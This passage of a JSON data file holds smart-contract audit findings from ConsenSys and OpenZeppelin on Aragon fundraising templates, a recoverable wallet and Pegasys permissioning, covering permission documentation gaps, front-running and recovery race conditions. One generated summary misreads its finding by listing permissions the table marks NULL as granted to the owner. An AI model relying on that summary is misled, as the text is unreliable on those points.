      "summary": "\nThis bug report is about the aragonOne/Fundraising and aragonBlack/Fundraising templates referencing the same apmNamehash for two different contracts, `Presale` and `BalanceRedirectPresale`. This could lead to confusion as to which application is actually deployed and the `ENS` registry must be verified before using the contract to prevent malicious applications from being deployed. To solve this issue, a unique `apmNamehash` should be generated for `BalanceRedirectPresale`. This was fixed with [aragonone/[emailprotected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) by generating a unique `apmNameHash` for `BalanceRedirectPresale` that does not collide with the one from `Presale`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne  Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13899",
      "title": "EOPBCTemplate - permission documentation inconsistencies Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFixed with [aragonone/[emailprotected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) by adding the undocumented and deviating permissions to the documentation.\n\n\n#### Description\n\n\n##### Undocumented\n\n\nThe template documentation provides an overview of the permissions set with the template. The following permissions are set by the template contract but are not documented in the accompanied `fundraising/templates/externally_owned_presale_bonding_curve/README.md`.\n\n\n**TokenManager**\n\n\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/contracts/EOPBCTemplate.sol:L220-L221**\n\n\n\n```\n\\_createPermissions(\\_acl, grantees, \\_fundraisingApps.bondedTokenManager, \\_fundraisingApps.bondedTokenManager.MINT\\_ROLE(), \\_owner);\n\\_acl.createPermission(\\_fundraisingApps.marketMaker, \\_fundraisingApps.bondedTokenManager, \\_fundraisingApps.bondedTokenManager.BURN\\_ROLE(), \\_owner);\n\n```\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/eopbc.yaml:L33-L44**\n\n\n\n```\n- app: anj-token-manager\n  role: MINT\\_ROLE\n  grantee: market-maker\n  manager: owner\n- app: anj-token-manager\n  role: MINT\\_ROLE\n  grantee: presale\n  manager: owner\n- app: anj-token-manager\n  role: BURN\\_ROLE\n  grantee: market-maker\n  manager: owner\n\n```\n##### Inconsistent\n\n\nThe following permissions are set by the template but are inconsistent to the outline in the documentation:\n\n\n**Controller**\n\n\n`owner` has the following permissions even though they are documented as not being set <https://github.com/ConsenSys/aragonone-presale-audit-2019-11/blob/9ddae8c7fde9dea3af3982b965a441239d81f370/code/fundraising/templates/externally_owned_presale_bonding_curve/README.md#controller>.\n\n\n\n```\n| App        | Permission                            | Grantee | Manager |\r\n| ---------- | ------------------------------------- | ------- | ------- |\r\n| Controller | UPDATE_BENEFICIARY                    | NULL    | NULL    |\r\n| Controller | UPDATE_FEES                           | NULL    | NULL    |\r\n| Controller | ADD_COLLATERAL_TOKEN                  | Owner   | Owner   |\r\n| Controller | REMOVE_COLLATERAL_TOKEN               | Owner   | Owner   |\r\n| Controller | UPDATE_COLLATERAL_TOKEN               | Owner   | Owner   |\r\n| Controller | UPDATE_MAXIMUM_TAP_RATE_INCREASE_PCT  | NULL    | NULL    |\r\n| Controller | UPDATE_MAXIMUM_TAP_FLOOR_DECREASE_PCT | NULL    | NULL    |\r\n| Controller | ADD_TOKEN_TAP                         | NULL    | NULL    |\r\n| Controller | UPDATE_TOKEN_TAP                      | NULL    | NULL    |\r\n| Controller | OPEN_PRESALE                          | Owner   | Owner   |\r\n| Controller | OPEN_TRADING                          | Presale | Owner   |\r\n| Controller | CONTRIBUTE                            | Any     | Owner   |\r\n| Controller | OPEN_BUY_ORDER                        | Any     | Owner   |\r\n| Controller | OPEN_SELL_ORDER                       | Any     | Owner   |\r\n| Controller | WITHDRAW                              | NULL    | NULL    |\r\n\n```\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/contracts/EOPBCTemplate.sol:L239-L240**\n\n\n\n```\n\\_acl.createPermission(\\_owner, \\_fundraisingApps.controller, \\_fundraisingApps.controller.UPDATE\\_BENEFICIARY\\_ROLE(), \\_owner);\n\\_acl.createPermission(\\_owner, \\_fundraisingApps.controller, \\_fundraisingApps.controller.UPDATE\\_FEES\\_ROLE(), \\_owner);\n\n```\n#### Recommendation\n\n\nFor transparency, all permissions set-up by the template must be documented.",
      "summary": "\nThis bug report is about the permissions set up by the template contract in the externally owned presale bonding curve (EOPBC) not being documented in the accompanying README.md. The template sets up two permissions that are not documented in the README.md: one in the TokenManager and one in the Controller. In the TokenManager, the owner is granted the MINT_ROLE and the marketMaker is granted the BURN_ROLE. In the Controller, the owner is granted the UPDATE_BENEFICIARY, UPDATE_FEES, ADD_COLLATERAL_TOKEN, REMOVE_COLLATERAL_TOKEN, UPDATE_COLLATERAL_TOKEN, UPDATE_MAXIMUM_TAP_RATE_INCREASE_PCT, UPDATE_MAXIMUM_TAP_FLOOR_DECREASE_PCT, ADD_TOKEN_TAP, UPDATE_TOKEN_TAP, OPEN_PRESALE, OPEN_TRADING, CONTRIBUTE, OPEN_BUY_ORDER, OPEN_SELL_ORDER, and WITHDRAW permissions.\n\nThe bug was fixed by adding the undocumented and deviating permissions to the documentation. For transparency, all permissions set-up by the template must be documented.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne  Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "11785",
      "title": "Overloaded functionality of the start_recovery() function",
      "impact": "LOW",
      "content": "The `start_recovery` function provides two functionalities. One is to allow a recovery address to initiate the recovery process when no recovery is underway. The other is to allow a recovery address with higher priority to usurp the current `active_recovery_address` when a recovery is already underway. These differing intentions both leverage the same function and both emit the same events.\n\n\nConsider disentangling these two functionalities by breaking the existing `start_recovery` function into two separate functions: a `startRecovery` function with the `only_outside_recovery` modifier that provides the first functionality, and a `usurpRecovery` function with the `only_during_recovery` modifier that provides the second functionality.\n\n\n***Update:*** *The**`start_recovery`* *function is still being used to both begin a new recovery and usurp an existing one, but it has been modified so that a* *`RecoveryCancelled`* *event is emitted when usurping. This ensures that the correct events are emitted in the order.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable WalletAudit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11784",
      "title": "Ownership transfer can be cancelled before one isunderway",
      "impact": "LOW",
      "content": "The `cancel_ownership_transfer` function ([line 44](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L44)) in the `Ownable` contract can be called when the `pending_owner` is `address(0)` (that is, when an ownership transfer is not already underway). This can result in an `ownership_transfer_cancelled` event being emitted without a corresponding `ownership_transfer_started` event having been emitted.\n\n\nIf this is not intended functionality, consider adding a `require(pending_owner!= address(0))` to the `cancel_ownership_transfer` function to prevent this.\n\n\n***Update:*** *A r**equire* *statement has been included that prevents the function from being called when no ownership transfer is underway.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable WalletAudit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11783",
      "title": "Ownership transfer can be started while another isunderway",
      "impact": "LOW",
      "content": "The `start_ownership_transfer` function ([line 38](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L38)) in the `Ownable` contract can be called when the `pending_owner` is NOT `address(0)` (that is, when an ownership transfer is already underway). This can result in two or more `ownership_transfer_started` events being emitted back-to-back, with no `ownership_transfer_cancelled` or `ownership_transfer_finished` events emitted in between.\n\n\nIf this is not intended functionality, consider adding a `require(pending_owner == address(0))` to the `start_ownership_transfer` function to prevent this.\n\n\n***Update:*** *The* *`start_ownership_transfer`* *function (since renamed to* *`startOwnershipTransfer`**) has been modified to first call the* *cancelOwnershipTransfer* *function before beginning a new ownership transfer. This ensures that the correct sequence of events is emitted.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable WalletAudit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11782",
      "title": "False comment in the start_recovery() function",
      "impact": "LOW",
      "content": "The comment on [line 103](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L103) states:\n\n\n\n> NOTE: the recovery address cannot change during recovery, so we can rely on this being!= 0\n> \n> \n\n\nThe second half of the statementthat we can rely on this being!= 0 is true. However the first part of the statementthat the recovery address cannot change during recovery is false. The function that contains the comment (the `start_recovery` function) is the means by which a recovery address can change during recovery. In particular, a recovery address can change during recovery when a recovery address with a higher priority than the current `active_recovery_address` calls the `start_recovery` function.\n\n\n***Update:*** *The comment has be updated to correctly reflect contract behavior.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable WalletAudit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11781",
      "title": "Duplicate code in the finish_recovery() function",
      "impact": "LOW",
      "content": "[Line 119](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L119) duplicates the code in the `only_during_recovery` modifier, which is already being applied to the `finish_recovery` function. Consider removing this superfluous line.\n\n\n***Update:*** *The duplicate code has been removed from the* *`finish_recovery`* *function.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable WalletAudit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11780",
      "title": "Unnecessary call to reset_recovery() in constructor",
      "impact": "LOW",
      "content": "Whether or not the recommendations from the issue **Unnecessary setting of the active\\_recovery\\_end\\_time variable** are taken into consideration, the call to `reset_recovery` on [line 80](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L80) is unnecessary since `active_recovery_address` and `active_recovery_end_time` will be set correctly when `start_recovery` is called. Consider removing this function call.\n\n\n***Update:*** *The call to**`reset_recovery`* *has been removed from the constructor.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable WalletAudit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11779",
      "title": "Unnecessary setting of the active_recovery_end_time variable",
      "impact": "LOW",
      "content": "The variable `active_recovery_end_time` is consumed only in the `finish_recovery` function (on [line 120](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L120)), which has the `only_during_recovery` modifier. The `only_during_recovery` modifier passes only when `active_recovery_address!= address(0)`. This occurs only after `start_recovery` has been called and before either `cancel_recovery` or `finish_recovery` has been called.\n\n\nSince `start_recovery` sets `active_recovery_end_time`, there is no need to set `active_recovery_end_time = uint256(-1)` on [line 67](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L67). Consider leaving the `active_recovery_end_time` variable uninitialized on [line 67](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L67).\n\n\nFor the same reason, it is unnecessary to set `active_recovery_end_time = uint256(-1);` in the `reset_recovery` function on [line 146](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L146). Consider removing the code at [line 146](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L146).\n\n\n***Update:*** *No changes have been made here. Setting* *`active_recovery_end_time`* *to* *`uint256(-1)`* *is intended to make code auditing and strict invariant checks easier.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable WalletAudit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11778",
      "title": "Obscure error message provided upon contract creationfailure",
      "impact": "LOW",
      "content": "The `deploy` function attempts to create a contract based on user-provided parameters and checks whether contract creation was successful by checking whether the output of `create2` is a non-zero address. If the wallet contract doesnt have enough balance to fund the newly created contract with the amount specified in the `_value` parameter, the transaction will revert with the obscure Contract creation failed. error message issued by the non-zero address check.\n\n\nConsider splitting this into two checks. First, we suggest adding a `require` statement to the beginning of the `deploy` function that checks whether the `RecoverableWallet` contract has a balance of at least `_value` ETH, and returns a meaningful error message otherwise. Second, rather than checking that the output of `create2` is a non-zero address, we recommend the more stringent requirement that code actually exists at the address returned by the call to `create2` using `extcodesize`.\n\n\n***Update:*** *The**`deploy`* *function has been modified to output more detailed messages in the event of a failed contract deployment. The**`extcodesize`* *option was not used because a valid* *`create2`* *call may not result in any code actually being deployed at the destination address (e.g.,**`self-destruct`* *in constructor or deployment code returning an empty bytecode array).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable WalletAudit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11777",
      "title": "Mixed usage of the recovery and ownership transfersystems",
      "impact": "LOW",
      "content": "On [line 122](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L122) the `finish_recovery` function sets `pending_owner = active_recovery_address;`. This requires the recovery address to then call `accept_ownership` in order to become the new owner. While this works fine, it requires two on-chain transactions and may result in an `ownership_transfer_finished` event being emitted without a corresponding `ownership_transfer_started` event preceding it.\n\n\nIf this is undesirable behavior, consider setting the `owner` instead of the `pending_owner` on [line 122](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L122), and then modifying the `recovery_finished` event accordingly. This would require one fewer on-chain transaction to change owners via the recovery process, and it would keep the recovery process and the ownership transfer system independent of one another.\n\n\n***Update:*** *The**`finish_recovery`* *function (since renamed to* *`finishRecovery`**) has been modified to directly set the new owner and emit the correct sequence of events.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable WalletAudit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11776",
      "title": "uint256/uint16 typemismatch",
      "impact": "LOW",
      "content": "There is a parameter type mismatch in the `recovery_address_added` event. The `recovery_delay_in_days` parameter in the `recovery_address_added` event ([line 59](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L59)) is of type `uint256`. This event is emitted on [line 89](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L89) with its second parameter being passed a `uint16`.\n\n\nConsider using `uint256` rather than `uint16` everywhere.\n\n\n***Update:*** *The type of the**`recovery_delay_in_days`* *parameter has been changed to* *`uint16`* *to resolve the type mismatch.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable WalletAudit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11775",
      "title": "Recovery cancellation can be front-run",
      "impact": "MEDIUM",
      "content": "Similar to the issue **Ownership transfer cancellation can be front-run**, cancellation of the recovery process can also be front-run. After the `start_recovery` function has been called by a recovery address, and after the `active_recovery_end_time` has passed, the owner may wish to call the `cancel_recovery` function to prevent finalization of recovery before someone calls the `finish_recovery` function. After the owner has broadcasted a transaction calling the `cancel_recovery` functionbut before that transaction is minedanyone may call the `finish_recovery` function using a transaction with a higher gas price.\n\n\nWhether or not this is a concern depends upon the intention of the owner when calling `cancel_recovery`. If the intention is to cancel the transfer of ownership to a non-responsive recovery address, then this poses no threat. If the intention, however, is to prevent the transfer of ownership to an `active_recovery_address` that is no longer trusted, then this may pose a threat.\n\n\n***Update:*** *This is intentional functionality and a comment has been added to the code to indicate this.*",
      "summary": "\nThis bug report is about the possibility of front-running the cancellation of the recovery process. This process is used when the owner of a certain asset wishes to transfer ownership to a recovery address, but the owner may wish to cancel the transfer before it is finalized. The issue is that before the cancellation is mined, anyone can call the `finish_recovery` function with a higher gas price, resulting in the transfer of ownership to the recovery address. Whether this is an issue or not depends on the owner's intent when calling `cancel_recovery`. If the intent is to cancel the transfer to a non-responsive recovery address, then this poses no threat. However, if the intent is to prevent the transfer to an `active_recovery_address` that is no longer trusted, then this poses a threat. It is important to note that this is intentional functionality and a comment has been added to the code to indicate this.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable WalletAudit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11774",
      "title": "Ownership transfer cancellation can be front-run",
      "impact": "MEDIUM",
      "content": "The `RecoverableWallet` contract implements an ownership transfer system whereby the owner may offer ownership of the `Ownable` contract to an address referred to as the `pending_owner`. This is achieved by calling the `start_ownership_transfer` function on [line 38](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L38). Afterwards, the `pending_owner` may accept ownership by calling the `accept_ownership` function on [line 50](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L50). If the current owner calls the `cancel_ownership_transfer` function *before* the `pending_owner` calls the `accept_ownership` function, then the offer is rescinded and the `pending_onwer` may no longer claim ownership.\n\n\nAfter the `start_ownership_transfer` function has been called by the owner, the owner may wish to call the `cancel_ownership_transfer` to prevent ownership transfer. After the owner has broadcasted a transaction calling the `cancel_ownership_transfer` functionbut before that transaction is minedthe `pending_owner` may call the `accept_ownership` function using a transaction with a higher gas price, thereby accepting ownership before the transaction to rescind the offer has been mined.\n\n\nWhether or not this is a concern depends upon the intention of the owner when calling `cancel_ownership_transfer`. If the intention is to cancel the transfer of ownership to a non-responsive address, then this poses no threat. If the intention, however, is to prevent the transfer of ownership to a `pending_owner` that is no longer trusted, then this may pose a threat.\n\n\n***Update:*** *This is intentional functionality and a comment has been added to the code to indicate this.*",
      "summary": "\nThe `RecoverableWallet` contract implements a system of ownership transfer between two parties, the owner and the pending_owner. The owner can offer ownership to the pending_owner by calling the `start_ownership_transfer` function. The pending_owner can then accept ownership by calling the `accept_ownership` function. The owner can also cancel the offer by calling the `cancel_ownership_transfer` function.\n\nHowever, if the owner broadcasts a transaction to cancel the offer before the pending_owner calls the `accept_ownership` function, the pending_owner may still be able to accept the offer by calling the `accept_ownership` function with a higher gas price before the transaction to rescind the offer is mined. This is intentional functionality and a comment has been added to the code to indicate this.\n\nWhether or not this poses a threat depends on the intention of the owner when calling the `cancel_ownership_transfer` function. If the intention is to cancel the transfer of ownership to a non-responsive address, then this poses no threat. But, if the intention is to prevent the transfer of ownership to a `pending_owner` that is no longer trusted, then this may pose a threat.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable WalletAudit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11773",
      "title": "Race condition may result from compromised recoveryaddress",
      "impact": "MEDIUM",
      "content": "The `RecoverableWallet` contract implements a recovery system whereby the owner can register a list of recovery addresses using the `add_recovery_address` function on [line 86](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L86). Each recovery address is associated with a positive `_recovery_delay_in_days`, and a recovery address with a strictly lower`_recovery_delay_in_days` is said to have a higher priority than a recovery address with a strictly higher `_recovery_delay_in_days`. The owner is able to remove recovery addresses using the `remove_recovery_address` function on [line 92](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L92).\n\n\nAt any time, a recover address may begin the recovery process by calling `start_recovery` ([line 97](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L97) of recoverable-wallet.sol), thereby becoming the `active_recovery_address`. This puts the contract in the in recovery state, during which several of the contracts functions cannot be called, including the `remove_recovery_address` function. The owner can abort the recovery process by calling the `cancel_recovery` function, thereby putting the contract back into the out of recovery state.\n\n\nIf a recovery address becomes compromised, the compromised address may call the `start_recovery` function, during which time the owner cannot remove the compromised address via the `remove_recovery_address` function due to the `only_outside_recovery` modifier. To remove the compromised address, the owner must first call the `cancel_recovery` function before calling `remove_recovery_address(<compromised_address>)`.\n\n\nHowever, once the owner has called the `cancel_recovery()` function, there exists a race condition during which the compromised address attempts to call `start_recovery()` again before the owner can call `remove_recovery_address(<compromised_address>)`. If successful, a compromised recovery address can keep the contract in a recovery state, thereby preventing any calls to any function with the `only_outside_recovery` modifierincluding the `deploy` and `execute` functions.\n\n\nIf compromised recovery addresses are within the scope of the threat model, consider adding a function with the `only_owner` and `only_during_recovery` modifiers that cancels the recovery process and removes the compromised address in a single function call.\n\n\n***Update:*** *A new function (**`cancelRecoveryAndRemoveRecoveryAddress`**), has been added which allows the owner to cancel the recovery process and remove the offending recovery address in a single transaction.*",
      "summary": "\nThe `RecoverableWallet` contract allows the owner to register a list of recovery addresses that can be used to recover the wallet in the event of an emergency. Each recovery address is associated with a `_recovery_delay_in_days` that determines its priority. The owner can remove recovery addresses at any time, unless the contract is in the in recovery state. In this case, the owner must first call the `cancel_recovery` function before calling `remove_recovery_address`.\n\nHowever, there was a race condition in which a compromised recovery address could call `start_recovery` again before the owner could call `remove_recovery_address`, thus preventing the owner from calling any function with the `only_outside_recovery` modifier. To address this, a new function (`cancelRecoveryAndRemoveRecoveryAddress`) has been added which allows the owner to cancel the recovery process and remove the compromised address in a single transaction.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable WalletAudit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11772",
      "title": "Contract does not conform to the ERC1820 specification",
      "impact": "MEDIUM",
      "content": "The [ERC1820](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1820.md) standard defines a universal registry where addresses can register the interfaces they support. The specification requires that compliant contracts have a `canImplementInterfaceForAddress(bytes32 interfaceHash, address addr)` function that returns the `ERC1820_ACCEPT_MAGIC` constant *if and only if* the contract implements the interface (`interfaceHash`) for a given address (`addr`).\n\n\nImportantly, EIP1820 [specifies](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1820.md#interface-implementation-erc1820implementerinterface):\n\n\n\n> If [the contract] does not implement the `interfaceHash` for a given address (`addr`), [the `canImplementInterfaceForAddress` function] MUST NOT return `ERC1820_ACCEPT_MAGIC`.\n> \n> \n\n\nOn [line 12 of](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L12) [recoverable-wallet.sol](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L12) the `Erc777TokensRecipient` contract implements a `canImplementInterfaceForAddress` function which returns the `ERC1820_ACCEPT_MAGIC` constant on all inputs. This would indicate to an external caller that the contract implements all interfaces for all addresses.\n\n\nConsider modifying this function so that it returns `ERC1820_ACCEPT_MAGIC` only when `interfaceHash` is `keccak256(abi.encodePacked(ERC777TokensRecipient)` and `addr` is `address(this)`.\n\n\nAdditionally, the ERC1820 standard defines the `canImplementInterfaceForAddress(bytes32 interfaceHash, address addr)` function with `bytes32 interfaceHash` as the first parameter and `address addr` as the second parameter. However, the implementation on [line 12 of recoverable-wallet.sol](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L12) has these parameters reversed. We recommend changing the order of these parameters so the `canImplementInterfaceForAddress` function complies with the ERC1820 specification.\n\n\n***Update:*** *The**`canImplementInterfaceForAddress`* *function has been modified to conform with the ERC1820 standard. Note that the comments in lines 18 and 21 are still using* *`addr`**, yet the variable has been renamed to* *`_implementer`**.*",
      "summary": "\nThis bug report is about the ERC1820 standard. This standard defines a universal registry where addresses can register the interfaces they support. The ERC1820 specification requires that compliant contracts have a `canImplementInterfaceForAddress(bytes32 interfaceHash, address addr)` function that returns the `ERC1820_ACCEPT_MAGIC` constant only if the contract implements the interface (`interfaceHash`) for a given address (`addr`). \n\nHowever, the implementation of the `canImplementInterfaceForAddress` function on line 12 of the recoverable-wallet.sol contract returns the `ERC1820_ACCEPT_MAGIC` constant on all inputs. This means the contract is indicating to an external caller that it implements all interfaces for all addresses which is not in compliance with the ERC1820 standard. \n\nThe bug report recommends modifying the `canImplementInterfaceForAddress` function so that it returns `ERC1820_ACCEPT_MAGIC` only when `interfaceHash` is `keccak256(abi.encodePacked(ERC777TokensRecipient)` and `addr` is `address(this)`. Additionally, the order of the parameters should be changed so the `canImplementInterfaceForAddress` function complies with the ERC1820 specification. \n\nThe bug report has been updated to say that the `canImplementInterfaceForAddress` function has been modified to conform with the ERC1820 standard. The comments in lines 18 and 21 are still using `addr`, yet the variable has been renamed to `_implementer`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable WalletAudit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "14009",
      "title": "ContractDetails.owner is never read Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThis is fixed in [PegaSysEng/[emailprotected]`d3f505e`](https://github.com/PegaSysEng/permissioning-smart-contracts/commit/d3f505e05c5ed8773571ba743d2b6247bc6c9955#diff-82548ee95e5f6919a3bcc96da0a7bcd3).\n\n\n#### Description\n\n\nThe `ContractDetails` struct used by `Ingress` contracts has an `owner` field that is written to, but it is never read.\n\n\n**code/contracts/Ingress.sol:L14-L19**\n\n\n\n```\nstruct ContractDetails {\n    address owner;\n    address contractAddress;\n}\n\nmapping(bytes32 => ContractDetails) registry;\n\n```\n#### Recommendation\n\n\nIf `owner` is not (yet) needed, the `ContractDetails` struct should be removed altogether and the type of `Ingress.registry` should change to `mapping(bytes32 => address)`",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Pegasys Permissioning",
      "source_link": "https://consensys.net/diligence/audits/2019/08/pegasys-permissioning/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Steve Marx",
        "John Mardlin",
        " Dean Pierce"
      ]
    },
    {
      "id": "14008",
      "title": "Use a specific Solidity compiler version Fixed",
      "impact": "LOW",
